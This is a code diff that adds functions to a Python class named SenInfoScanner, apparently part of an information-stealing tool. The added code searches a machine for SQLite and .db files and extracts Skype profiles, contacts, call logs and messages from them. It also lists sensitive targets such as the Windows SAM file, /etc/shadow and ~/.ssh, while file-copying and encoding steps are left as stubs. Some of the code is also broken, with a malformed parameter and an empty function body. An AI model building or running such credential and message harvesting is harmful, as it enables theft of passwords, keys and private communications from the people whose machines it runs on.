@@ -18,6 +18,7 @@ import browserhistory as bh
 import base64
 import zipfile
 import gzip
+import Skype
 
 
 class SysInfoScanner:
@@ -220,19 +221,82 @@ class SenInfoScanner:
         return cache_paths
 
 
-    def _db(self,):
+    def _db(self, return_info: False):
         ''' cover potential db info like skype contact info
         
         '''
         db_files = []
-
+        for root, dirs, files in os.walk(self.root_path):
+            for file in files:
+                if file.endswith('.sqlite') or file.endswith('.db'):
+                    db_files.append(os.path.join(root, file))
         
+        if return_info:
+            # optional manipulation
+            db_info = []
+            for db_file in db_files:
+                try:
+                    dbreader = Skype.SkypeDB(db_file)
+                    profile_list = dbreader.ExtProfile()
+                    contracts_list = dbreader.ExtContracts()
+                    calllog_list = dbreader.ExtCallLog()
+                    message_list = dbreader.ExtMessage()
+                    db_info.append(
+                        {"db_file": db_file,
+                        "profile": profile_list,
+                        "contracts": contracts_list,
+                        "calllog": calllog_list,
+                        "messages": message_list
+                        }
+                    )
+                except Exception as e:
+                    db_info.append(
+                        {"db_file": db_file,
+                        "error": str(e)
+                        }
+                    )
+            return db_info
+        else:
+            return db_files
+
 
     def _path(self,):
+        sen_paths = []
+
+        if platform.system() == "Windows":
+            comm_sen_paths = [
+                # Windows SAM file
+                'C:\\Windows\\System32\\config\\SAM',    
+                # User AppData Local folder         
+                os.path.expanduser('~\\AppData\\Local'),    
+                # Program Files       
+                'C:\\Program Files',     
+                # Program Files for 32-bit apps                          
+                'C:\\Program Files (x86)',                         
+                os.path.expanduser('~\\Documents'),   
+            ]
+        else:
+            comm_sen_paths = [
+                # User account details
+                '/etc/passwd',         
+                 # Shadow password file                            
+                '/etc/shadow',         
+                # SSH configuration folder                           
+                os.path.expanduser('~/.ssh'),      
+                # Log files                
+                '/var/log',                                        
+                os.path.expanduser('~/Documents'), 
+            ]
+
+        for path in comm_sen_paths:
+            if os.path.exists(path):
+                sen_paths.append(path)
+        
+        return sen_paths
 
     
     def _copy_files(self,):
-
+        
 
     
     def _encode(self,):
